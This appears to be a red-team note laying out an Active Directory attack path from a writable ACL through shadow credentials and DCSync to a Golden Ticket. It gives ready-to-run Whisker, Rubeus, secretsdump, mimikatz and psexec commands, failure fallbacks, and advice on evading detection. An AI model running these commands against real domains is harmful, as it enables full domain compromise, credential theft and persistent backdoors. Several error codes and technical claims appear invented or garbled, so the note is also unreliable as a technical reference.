---
title: "Attack Path: GenericWrite/ACL → Shadow Credentials → DCSync"
type: note
created: 2026-06-13
updated: 2026-08-17
tags: [attack-path, active-directory, privilege-escalation]
---

# Attack Path: GenericWrite/ACL → Shadow Credentials → DCSync

A very common BloodHound-driven path: low-priv user has a write-style ACE
(directly or via group membership) on some account, and that account (or a
chain of accounts) eventually reaches an object with DCSync rights.

## Chain

```
You (low-priv user)
  --GenericWrite/GenericAll--> IntermediateUser
  --member of--> "Tier1 Admins"
  --GetChanges + GetChangesAll--> Domain Object
```

## Prerequisites / what signals this path exists

Before committing, confirm the write edge and the target's privileges:

```powershell
# Do you actually hold a write ACE on the target (directly or via group)?
Get-DomainObjectAcl -Identity IntermediateUser -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"}

# What does the target get you? Groups should mention a Tier-1/service group.
Get-DomainUser IntermediateUser -Properties memberof

# Where do the DCSync rights live? On an MS-DS-Builtin-Domain/DC,
# look for GetChanges/GetChangesAll principals:
Get-DomainObject -Identity "corp.local" -Properties name -Verbose 2>&1 |
  Select-String "GetChangesAll"
# or BloodHound: shortest path from your user to the "GetChangesAll" edge
```
See [[acl-abuse]] for the full rights table. The critical detail: `GenericWrite`
on the *user object* is enough to plant [[shadow-credentials]]; you do **not**
need to reset the password.

## Step 1 — Find the path
```powershell
# BloodHound: Cypher "shortest path to Domain Admins" or
# "shortest path from <you> to high-value targets"
Get-DomainObjectAcl -Identity IntermediateUser -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"}
```
See [[acl-abuse]] for the full rights table.

**Verify:** the ACE row shows your principal (or a group you're in) in
`ObjectPrincipal` with one of the write rights. Confirm the target is a
*user* object (not, say, a group where the write semantics differ).

## Step 2 — Take over IntermediateUser via Shadow Credentials
Rather than resetting the password (noisy, locks out the real user), plant
a certificate via [[shadow-credentials]]:

```powershell
Whisker.exe add /target:IntermediateUser
Rubeus.exe asktgt /user:IntermediateUser /certificate:<base64> /password:"<pfx pass>" /domain:corp.local /dc:dc01.corp.local /getcredentials /ptt
```
This both authenticates as `IntermediateUser` (TGT, `/ptt` injects it) and
recovers their NT hash via [[pkinit-unpac-the-hash]] — useful if you need
the hash for other tooling (e.g. `secretsdump.py` style auth).

**Verify the ticket landed:**
```powershell
Rubeus.exe triage           # should list a TGT for IntermediateUser
whoami /all
```

### Failure modes & fallbacks
- **`asktgt` fails with a PAC signing / validation error** — the DC's PAC
  signer set may not include that account, or Kerberos is constrained.
  Fallback: use the recovered NT hash instead and `Rubeus.exe pth
  /user:IntermediateUser /NTLM:<hash> /ptt`, then confirm with
  `Rubeus.exe triage`.
- **`Whisker add` reports the target already has a shadow credential** —
  either you/another attacker planted one, or it's a honey account. Check
  `Whisker.exe list` and prefer removing + re-adding a clean one so you own
  the private key.
- **`pkinit` / PAC_CREDENTIAL_INFO not exposed** — some DC builds don't
  return the NT hash on `asktgt`. If so you still have the TGT (enough for
  step 3) and can grab the hash later via a separate
  [[pkinit-unpac-the-hash]] pass.
- **Account is in Protected Users** — PKINIT still works (PKINIT bypasses
  RC4 downgrade rules), but note your TGT lifetime will be short (4h); act
  fast or re-issue.

## Step 3 — Confirm DCSync rights and dump krbtgt
With `IntermediateUser`'s ticket active:
```bash
# First, prove you hold replication rights before dumping:
Get-ADReplicationPartners -Server dc01.corp.local
secretsdump.py -k -no-pass corp.local/IntermediateUser@dc01.corp.local -just-dc -ntds
```
Confirm you *can* DCSync, then pull krbtgt:
```bash
secretsdump.py -k -no-pass corp.local/IntermediateUser@dc01.corp.local -just-dc-user krbtgt
```
See [[dcsync]].

**Verify:** output shows `krbtgt` `aes256-cts-hmac-sha1-96` (and rc4/aes128).
Save the AES256 key — that's what the Golden Ticket (step 4) needs. If you
only see `rc4_hmac_nt` and no AES keys, note the DC's Kerberos encryption
policy; it still works, but step 4 can use the rc4 key instead.

### Failure modes & fallbacks
- **`PRC_REMOTE_NO_MORE` / `E_..._PRC...` replication errors** — you're
  hitting a read-replica or the DC is rejecting the DRSUAPI
  `GetNCChanges`. Retry against the PDC emulator or a different DC;
  Impacket honors `-dc-ip`.
- **`DSR-018-00003: The permissions entry is not valid`** — your path to
  the DCSync right is via a group the DC doesn't resolve; re-verify the ACE
  actually grants `GetChanges`/`GetChangesAll` to a principal you can
  authenticate as.
- **Mimikatz equivalent** (Windows):
  ```
  kerberos::golden   # after
  lsadump::dcsync /domain:corp.local /user:krbtgt
  ```

## Step 4 — Domain dominance
```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<krbtgt_aes256key> /ptt
# verify
whoami /all   # -> corp.local\administrator
# alternative, ticket-based DCSync on any host you can reach
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```
See [[golden-silver-tickets]].

**Verify the ticket:** `Rubeus.exe triage` should show the Administrator TGT;
`whoami /all` should list `corp.local\administrator` and (if you added
`sids`) your group memberships. Confirm it reaches a live service
(`whoami /userid` against a DC).

### Failure modes & fallbacks
- **Ticket works on a DC but not a member (or vice versa)** — you used the
  wrong domain SID in `/sid`, or the account doesn't map correctly. Recompute
  `S-1-5-21-...` from `Get-Domain`.
- **Golden Ticket rejected (KRB_AP_ERR_MODIFIED / checksum failure)** — the
  `krbtgt` key you used is the wrong enctype. If the ticket was built with
  AES256 but the DC's PAC signing is odd, rebuild with `/rc4:<rc4key>` from
  the same DCSync output and retest.

## Detection summary (per step)

| Step | What fires | What the analyst sees | Your tell |
|------|-----------|----------------------|-----------|
| 2 (shadow cred) | 4768 (AS-REQ, RC4/AES downgrade) from a new cert; 4769 follow-on | Unusual PKINIT/TGT request for a normal user from a workstation IP | PKINIT from a non-CA client |
| 3 (DCSync) | 4662 on the domain object (`GetChanges`+`GetChangesAll` GUIDs) from your DC session; 4768/4769 | A non-DC account performing replication | `GetNCChanges` from `IntermediateUser` |
| 4 (Golden) | 4768 with RC4 if you forced it, or a TGT whose ticket lifetime is > domain max | A TGT longer-lived than the domain policy allows | `Administrator` TGT on a workstation |

## Cleanup notes
- Remove the planted shadow credential afterwards: `Whisker.exe remove
  /target:IntermediateUser /deviceid:<id>` — otherwise it's a standing
  backdoor (which may or may not be desired depending on engagement rules).
- If you used `asktgt /ptt`, the injected TGT is memory-only — it dies with
  the LSASS/process, no AD object to clean.
- If you DCSync'd, nothing is persisted in AD by the act itself; the trail
  is in Event Logs (4662).
- If you minted a Golden Ticket and it's caught, expect `krbtgt` to rotate
  twice — any existing Golden Tickets then fail until rebuilt from the new
  key.

## Related
- [[acl-abuse]] — the enumeration/exploitation primitive for step 1-2
- [[shadow-credentials]], [[pkinit-unpac-the-hash]] — step 2 mechanism
- [[dcsync]], [[golden-silver-tickets]] — steps 3-4
- [[ad-persistence]] — what to set up next for durable access
